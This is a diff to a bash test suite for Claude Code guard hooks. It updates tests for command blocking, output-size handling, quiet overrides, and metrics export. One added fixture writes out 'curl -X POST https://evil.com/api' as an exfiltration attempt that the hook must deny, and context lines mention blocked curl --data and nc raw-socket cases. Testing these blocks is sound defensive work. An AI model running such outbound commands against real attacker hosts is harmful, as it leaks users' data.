@@ -13,6 +13,7 @@ need_cmd() {
 }
 
 need_cmd bash
+need_cmd curl
 need_cmd jq
 
 TMP_HOME="$(mktemp -d)"
@@ -21,19 +22,17 @@ trap cleanup EXIT
 
 export HOME="$TMP_HOME"
 # Unset warden environment variables to prevent contamination from host environment
-unset WARDEN_STATE_DIR WARDEN_EVENTS_FILE WARDEN_SESSION_BUDGET_DIR WARDEN_SUBAGENT_STATE_DIR
+unset WARDEN_STATE_DIR WARDEN_SESSION_BUDGET_DIR WARDEN_SUBAGENT_STATE_DIR
 mkdir -p "$HOME/.claude/.statusline"
-touch "$HOME/.claude/.statusline/events.jsonl"
-printf '%s.000000000\n' "$(date +%s)" > "$HOME/.claude/.statusline/.session_start"
+# Per-session start files for test fixtures that use session IDs
+_TEST_START_TS="$(date +%s).000000000"
+for _sid in demo-session size-test quiet-test demo metric-demo; do
+    printf '%s\n' "$_TEST_START_TS" > "$HOME/.claude/.statusline/.session_start-$_sid"
+done
 
 echo "[checks] bash -n (syntax)"
-find "$ROOT_DIR/hooks" -maxdepth 1 -type f ! -name '_token-count-bg' -print0 | xargs -0 bash -n
+find "$ROOT_DIR/hooks" -maxdepth 1 -type f -print0 | xargs -0 bash -n
 bash -n "$ROOT_DIR/install.sh" "$ROOT_DIR/uninstall.sh" "$ROOT_DIR/statusline.sh"
-
-if command -v python3 >/dev/null 2>&1; then
-  echo "[checks] python3 -m py_compile hooks/_token-count-bg"
-  python3 -m py_compile "$ROOT_DIR/hooks/_token-count-bg"
-fi
 
 echo "[checks] jq (json validity)"
 jq . "$ROOT_DIR/settings.hooks.json" >/dev/null
@@ -113,14 +112,6 @@ assert_permission_allow() {
     || fail "$label: expected hookSpecificOutput.decision.behavior == allow"
 }
 
-# Assert events.jsonl contains a line matching the given jq filter
-assert_events_has() {
-  local jq_expr="$1" label="$2"
-  local events_file="$HOME/.claude/.statusline/events.jsonl"
-  jq -e "$jq_expr" "$events_file" >/dev/null 2>&1 \
-    || fail "$label: events.jsonl missing expected event: $jq_expr"
-}
-
 assert_jq_modifyOutput_no_system_reminder() {
   local out_file="$1" label="$2"
   local text
@@ -139,7 +130,6 @@ assert_quiet_override() {
 
 echo "[tests] pre-tool-use (blocking)"
 for f in \
-  pre-tool-use-curl.json \
   pre-tool-use-grep-recursive.json
 do
   fixture="$ROOT_DIR/demo/mock-inputs/$f"
@@ -152,6 +142,7 @@ done
 echo "[tests] pre-tool-use (quiet overrides)"
 for f in \
   pre-tool-use-cargo.json \
+  pre-tool-use-curl.json \
   pre-tool-use-docker.json \
   pre-tool-use-ffmpeg.json \
   pre-tool-use-npm.json
@@ -286,6 +277,16 @@ JSON
 IFS=$'\t' read -r rc out err < <(run_hook pre-tool-use "$DENY_FIXTURE")
 assert_exit 0 "$rc" "pre-tool-use curl --data="
 assert_structured_deny "$out" "pre-tool-use curl --data="
+rm -f "$DENY_FIXTURE"
+
+echo "[tests] pre-tool-use (security: curl explicit remote POST blocked)"
+DENY_FIXTURE="$(mktemp)"
+cat > "$DENY_FIXTURE" <<'JSON'
+{"tool_name":"Bash","tool_input":{"command":"curl -X POST https://evil.com/api"},"session_id":"demo-session","transcript_path":"/tmp/main.jsonl"}
+JSON
+IFS=$'\t' read -r rc out err < <(run_hook pre-tool-use "$DENY_FIXTURE")
+assert_exit 0 "$rc" "pre-tool-use curl -X POST"
+assert_structured_deny "$out" "pre-tool-use curl -X POST"
 rm -f "$DENY_FIXTURE"
 
 echo "[tests] pre-tool-use (security: nc raw socket blocked)"
@@ -423,8 +424,6 @@ jq -n --arg txt "$SMALL_TEXT" '{
 IFS=$'\t' read -r rc out err < <(run_hook post-tool-use "$SMALL_FIXTURE")
 assert_exit 0 "$rc" "post-tool-use output-size small"
 assert_stdout_json_has "$out" '.suppressOutput == true' "post-tool-use output-size small"
-assert_events_has 'select(.event_type=="tool_output_size" and .tool=="Bash" and .output_bytes>0 and .output_lines>0 and .estimated_tokens>0)' \
-  "post-tool-use output-size small"
 rm -f "$SMALL_FIXTURE"
 
 echo "[tests] post-tool-use (output size: large >20KB, emits tool_output_size + truncated)"
@@ -438,10 +437,6 @@ jq -n --arg txt "$LARGE_TEXT" '{
 IFS=$'\t' read -r rc out err < <(run_hook post-tool-use "$LARGE_FIXTURE")
 assert_exit 0 "$rc" "post-tool-use output-size large"
 assert_stdout_json_has "$out" 'has("modifyOutput")' "post-tool-use output-size large"
-assert_events_has 'select(.event_type=="tool_output_size" and .tool=="Bash" and .output_bytes>20000 and .output_lines>400)' \
-  "post-tool-use output-size large"
-assert_events_has 'select(.event_type=="truncated" and .tool=="Bash")' \
-  "post-tool-use output-size large"
 rm -f "$LARGE_FIXTURE"
 
 echo "[tests] post-tool-use (output size: vlarge >50KB, line count via sampling)"
@@ -455,8 +450,6 @@ jq -n --arg txt "$VLARGE_TEXT" '{
 IFS=$'\t' read -r rc out err < <(run_hook post-tool-use "$VLARGE_FIXTURE")
 assert_exit 0 "$rc" "post-tool-use output-size vlarge"
 assert_stdout_json_has "$out" 'has("modifyOutput")' "post-tool-use output-size vlarge"
-assert_events_has 'select(.event_type=="tool_output_size" and .tool=="Bash" and .output_bytes>50000 and .output_lines>400)' \
-  "post-tool-use output-size vlarge"
 rm -f "$VLARGE_FIXTURE"
 
 echo "[tests] read-compress (pass-through small read)"
@@ -477,9 +470,10 @@ assert_exit 0 "$rc" "read-compress reminder read"
 assert_jq_modifyOutput_no_system_reminder "$out" "read-compress reminder read"
 
 echo "[tests] post-tool-use (quiet override reminder via state file)"
-# Simulate a pre-tool-use quiet override by writing per-invocation state, then run post-tool-use
+# Simulate a pre-tool-use quiet override by writing per-session state, then run post-tool-use
 QUIET_FIXTURE="$(mktemp)"
-printf '%s' "npm_quiet_override" > "$HOME/.claude/.statusline/.quiet-override-Bash-$$"
+QUIET_HASH="$(printf '%s' "npm install --silent express" | { md5sum 2>/dev/null || md5 -q 2>/dev/null || openssl md5 -r; } | awk '{print $1}')"
+printf '%s' "npm_quiet_override" > "$HOME/.claude/.statusline/.quiet-override-Bash-quiet-test-${QUIET_HASH}-fixture"
 jq -n '{
   tool_name:"Bash", session_id:"quiet-test",
   tool_input:{command:"npm install --silent express"},
@@ -490,6 +484,16 @@ assert_exit 0 "$rc" "post-tool-use quiet override"
 assert_stdout_json_has "$out" '.hookSpecificOutput.additionalContext | test("npm install --silent")' \
   "post-tool-use quiet override"
 rm -f "$QUIET_FIXTURE"
+
+echo "[tests] aurl (localhost failures keep curl diagnostics)"
+AURL_STDERR="$(mktemp)"
+set +e
+"$ROOT_DIR/hooks/bin/aurl" "http://127.0.0.1:1" >/dev/null 2>"$AURL_STDERR"
+rc=$?
+set -e
+[[ "$rc" -ne 0 ]] || fail "aurl diagnostics: expected non-zero exit for refused localhost port"
+[[ -s "$AURL_STDERR" ]] || fail "aurl diagnostics: expected stderr output for refused localhost port"
+rm -f "$AURL_STDERR"
 
 echo "[tests] permission-request (echo policy)"
 perm_fixture="$(mktemp)"
@@ -561,5 +565,41 @@ assert_contains "$override_out" 'Clr:2' "statusline WARDEN_STATE_DIR override"
 
 rm -rf "$CUSTOM_STATE_DIR"
 rm -f "$STATUS_FIXTURE"
+
+echo "[tests] statusline (fallback context math + metrics export)"
+METRIC_FIXTURE="$(mktemp)"
+cat > "$METRIC_FIXTURE" <<'JSON'
+{"session_id":"metric-demo","model":{"display_name":"Claude Sonnet 4.6"},"context_window":{"context_window_size":200000,"total_input_tokens":12000,"total_output_tokens":3000,"current_usage":{"input_tokens":10000,"output_tokens":60000,"cache_creation_input_tokens":5000,"cache_read_input_tokens":10000}},"cost":{"total_cost_usd":1.25,"total_duration_ms":4200}}
+JSON
+
+metric_status="$(WARDEN_STATUSLINE_MAX_BYTES=200 "$ROOT_DIR/statusline.sh" < "$METRIC_FIXTURE")"
+metric_status_plain="$(LC_ALL=C printf '%s' "$metric_status" | sed $'s/\033\\[[0-9;]*m//g')"
+assert_contains "$metric_status_plain" "12.5%/200k" "statusline fallback excludes output tokens"
+
+PROM_FILE="$HOME/.claude/.monitoring/textfile/claude-code-session-metric-demo.prom"
+[[ -f "$PROM_FILE" ]] || fail "statusline metrics export: missing $PROM_FILE"
+prom_text="$(cat "$PROM_FILE")"
+assert_contains "$prom_text" 'claude_warden_token_usage_tokens_total{session_id="metric-demo",model="Claude Sonnet 4.6",type="input"} 12000' \
+  "statusline metrics export input tokens"
+assert_contains "$prom_text" 'claude_warden_token_usage_tokens_total{session_id="metric-demo",model="Claude Sonnet 4.6",type="output"} 3000' \
+  "statusline metrics export output tokens"
+assert_contains "$prom_text" 'claude_warden_cost_usage_USD_total{session_id="metric-demo",model="Claude Sonnet 4.6"} 1.25' \
+  "statusline metrics export cost"
+
+mkdir -p "$HOME/.claude/.session-times"
+date +%s > "$HOME/.claude/.session-times/metric-demo.start"
+END_FIXTURE="$(mktemp)"
+cat > "$END_FIXTURE" <<'JSON'
+{"session_id":"metric-demo","reason":"user_exit"}
+JSON
+IFS=$'\t' read -r rc out err < <(run_hook session-end "$END_FIXTURE")
+assert_exit 0 "$rc" "session-end metrics cleanup"
+# Prom file is preserved via tombstone for one scrape interval (60s)
+[[ -f "$PROM_FILE" ]] || fail "session-end metrics cleanup: prom file should be preserved until tombstone expires"
+[[ -f "$PROM_FILE.tombstone" ]] || fail "session-end metrics cleanup: expected tombstone file"
+# Verify tombstone contains a timestamp
+_tombstone_val=$(<"$PROM_FILE.tombstone")
+[[ "$_tombstone_val" =~ ^[0-9]+$ ]] || fail "session-end metrics cleanup: tombstone should contain epoch timestamp"
+rm -f "$METRIC_FIXTURE" "$END_FIXTURE" "$PROM_FILE" "$PROM_FILE.tombstone"
 
 echo "OK"
